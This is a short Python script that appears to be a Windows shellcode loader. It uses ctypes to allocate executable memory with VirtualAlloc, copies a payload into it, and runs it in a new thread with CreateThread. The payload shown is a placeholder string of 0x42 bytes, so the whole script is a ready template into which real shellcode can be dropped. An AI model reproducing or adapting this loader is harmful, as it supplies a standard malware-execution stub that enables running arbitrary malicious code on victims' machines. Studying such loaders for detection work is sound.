import ctypes

payload = bytearray("\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42")

pointer = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(payload)),ctypes.c_int(0x3000),ctypes.c_int(0x40))

buffer = (ctypes.c_char * len(payload)).from_buffer(payload)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(pointer), buffer, ctypes.c_int(len(payload)))

thread = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                                ctypes.c_int(0),
                                                ctypes.c_int(pointer),
                                                ctypes.c_int(0),
                                                ctypes.c_int(0),
                                                ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(thread), ctypes.c_int(-1))


